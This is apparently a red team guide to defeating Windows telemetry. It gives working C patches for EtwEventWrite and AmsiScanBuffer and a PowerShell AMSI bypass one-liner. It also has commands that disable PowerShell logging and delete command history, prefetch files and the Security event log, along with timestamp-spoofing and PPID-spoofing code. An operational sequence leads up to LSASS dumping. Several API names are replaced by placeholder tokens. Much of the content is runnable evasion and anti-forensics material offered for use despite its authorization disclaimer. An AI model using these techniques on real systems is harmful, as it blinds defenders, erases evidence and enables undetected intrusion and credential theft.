# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> For authorized red team / adversary exercises / in-house product testing only, prohibited for use on unauthorized targets.

The detection capability of EDR largely relies on the two telemetry channels: ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This document summarizes red team countermeasures for these two pipelines, and supplements anti-forensics combinations such as Sysmon / PowerShell logging / timestamp spoofing.

Refer to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW Internal Structure

ETW is Windows' built-in high-performance event tracing framework, which EDR uses for 'lightweight kernel telemetry'.
The provider the red team cares about most:

| Provider GUID | Name | Who is using it |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI Report |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Process / Thread Basic Events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET Loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR Startup |

### Key User-Mode APIs

| API | DLL | Function |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | Write event (most commonly used) |
| `EtwEventWriteFull` | `ntdll.dll` | Event with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | Extended Version |
| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite underlying layer |
| `NtTraceControl` | `ntdll.dll` | Control trace session (start/stop/query provider) |
| `EtwEventEnabled` | `ntdll.dll` | Is the provider enabled |
| `EtwEventRegister` | `ntdll.dll` | Register provider |

### Call Chain

```text
Application code EventWrite(...)
→ Microsoft Packaging (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
→ nt!NtTraceEvent (kernel)
→ Kernel ETW core → Consumer (EDR user-mode process subscribes to session)
```

## 2. Three Methods of ETW Patch

### Method A: EtwEventWrite head patch

Directly change the `ntdll!EtwEventWrite` entry to immediately return success:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

After patch (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

// Note: VirtualProtect itself may be hooked -> use the indirect syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC Warning**: Writing ntdll memory itself is the `ALPC_MODIFY_PROCESS` / `PROTECTVM` event source monitored by ETW-TI.
You must **first use an indirect syscall + bypass the NtProtectVirtualMemory hook before patching**,
Otherwise, EDR will receive the alert before the patch takes effect.

### Method B: EtwEventEnabled always-false

More covert: instead of modifying `EtwEventWrite`, make `EtwEventEnabled` always return FALSE,
The application layer will determine by itself if 'provider is not enabled' → it will not call `EtwEventWrite`, which is more friendly for memory hash integrity checks (many EDRs check the `EtwEventWrite` bytes).

```c
// EtwEventEnabled usually returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl Close provider

Directly close the EDR session using syscall (intrusive, but without modifying ntdll bytes):

```c
// NtTraceControl(EtwpStopTrace, ...)
// Requires SeSystemProfilePrivilege or higher
// Applicable after Local Admin + UAC bypass
```

Rarely used in practice, because:

- Closing the session itself will trigger the 'ETW provider stopped' event, which is detected by another pipeline
- Requires high permissions

### Method D: Kernel-Mode ETW Patch (Only When BYOVD/Kernel Read-Write Is Already Available)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
Directly set to 0 to discard all ETW-TI events
```

Belonging to the BYOVD stage of the attack chain, this skill is not detailed.

## 3. AMSI Bypass

AMSI is an interface provided by Windows for PowerShell / .NET / WMI / VBA to perform antivirus scanning before executing scripts.
The red team most frequently encounters PowerShell + AMSI.

### Classic AmsiScanBuffer Patch

```c
// amsi.dll!AmsiScanBuffer entry write:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell one-liner version (for reference in detection evasion only, itself is signed / blocked by Defender):

```powershell
# Concept Demonstration — In Real Environments, Must Combine with Obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced Plan 1: Hardware Breakpoint AMSI Bypass

Keep amsi.dll memory unchanged (will not trigger integrity scan):

1. AddVectoredExceptionHandler
2. Set xKx0000xKx at the xKx0001xKx entrance
3. Set xKx0002xKx, xKx0003xKx, xKx0004xKx when VEH hits
4. Continue Execution

The same infrastructure as HWBP Blindside in unhook-techniques.md can share VEH.

### Advanced Plan 2: Damage to AmsiContext / AmsiSession

Construct a malformed xKx0005xKx structure, causing xKx0006xKx to return success early due to a verification failure:

```text
// The AmsiContext header should be the "AMSI" magic number
// Change to "XXXX" → Internal verification of AmsiScanBuffer failed but returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced Plan 3: Reflective Loading of the amsi.dll Copy

Do not use the system amsi.dll; load a clean copy reflectively into your own process and redirect PowerShell engine calls to AMSI.
Applicable to advanced EDRs that have already intercepted the launch of PowerShell.exe during the loading phase.

## 4. Anti-Forensics: Clearing Traces

### PowerShell ScriptBlock Logging Off

```powershell
# Registry (Admin required)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy Path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clear PowerShell history

```powershell
# Current Session
Clear-History
# Persisting history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clear Prefetch

```powershell
# Requires SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Clear All (Big Action, Use Caution)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clear ETL log

```powershell
# Delete ETL after stopping the session
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: Directly deleting .evtx will be recreated by the Event Log Service and a 'log cleared' event (Event ID 1102) will be written
# More covert: Patch the EventLog API in wevtsvc.dll in memory (part of T1070.001)
```

### Timestamp Spoofing (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon Monitoring Evasion

Sysmon is the most common free telemetry in the community (many enterprises use Olaf to configure it).
Key Event:

| Event ID | Meaning |
|----------|------|
| 1 | ProcessCreate (including PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL Loading) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | Registry |
| 22 | DNS Query |
| 25 | Process Tampering (image hollowing) |

### Avoidance Approach

1. **Do not create new processes** — operate entirely within the injected process to avoid Event ID 1
2. **PPID Spoof** — Use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set the PPID to `explorer.exe`, making Sysmon ProcessCreate look legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + static image** — Process Hollowing is already detected by Event ID 25 in the new version of Sysmon.
The first choice is to use **module stomping** (overwriting a section of a legitimately loaded DLL) or newer techniques such as **dirty vanity**, 
   Works with PPID spoof
4. **Do not use remote threads** — Avoid Event ID 8; use `NtCreateThreadEx` to execute / APC / Early Bird APC within your own process
5. **DNS over DoH / HTTPS** — Avoid Event ID 22

## 6. Call Stack Spoof + Timestamp Makes Events Look Like Legitimate Software

Even if ProcessCreate cannot be prevented from triggering (for example, in some scenarios where spawning a child is necessary), you can:

- Change the CommandLine to a format similar to that of a legitimate software
- PPID spoof to services.exe (disguised as a service started by SCM)
- Modify the Image hash seen by ImageLoad: embed the implant code into the memory space of a signed DLL through module stomping
- Works with CallStackSpoofer: Even if Sysmon has EnableCallTracing turned on, it can't see the implant frames

## 7. Practical OPSEC: Order of Operations

**If the order is wrong, EDR will receive a warning first**, causing subsequent actions to be directly fused.

Correct order:

```text
1. AMSI bypass (prefer HWBP, avoid writing amsi.dll)
─── Prevent .NET / PowerShell from being scanned when loading the implant
2. ETW patch (patch EtwEventWrite first, then perform any syscall)
─── Disable telemetry for subsequent actions
3. NtProtectVirtualMemory is called using an indirect syscall
─── Prepare a "safe" memory permission switch channel
4. Unhook ntdll (Perun's Fart) or enable indirect syscall
─── Remove user-mode hook
5. Call stack spoof setup
─── The pseudo stack of all syscalls after preparation
6. Actual payload execution (injection / lateral movement / dump LSASS)
7. Clear traces (PowerShell history / Prefetch / timestamps)
```

Example of incorrect order:

```text
❌ First unhook ntdll → ETW-TI immediately reports PROTECTVM + module modification → SOC has already received the alert
❌ First dump LSASS → AMSI / ETW not bypassed yet → High confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching Overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass Collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Route Callback

After completing this set of three tasks (hook research → unhook → telemetry blinding), go back to `README.md` Step 5 to verify in the sandbox,
Then proceed to the next stage according to the initial access and lateral movement sections of `attack-chain/`.